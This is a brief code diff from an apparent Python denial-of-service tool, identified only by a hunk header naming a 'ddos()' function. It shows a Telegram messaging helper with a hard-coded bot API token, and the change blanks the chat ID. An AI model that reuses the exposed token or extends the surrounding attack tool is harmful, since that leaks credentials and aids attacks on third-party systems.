@@ -178,7 +178,7 @@ def ddos():
 def send_to_telegram(message):
 
     apiToken = '5623414566:AAGKkS-1jP2mWgCSYVkSkMDs9QmvLnmaegU'
-    chatID = '1095815228'
+    chatID = ''
     apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'
 
     try:
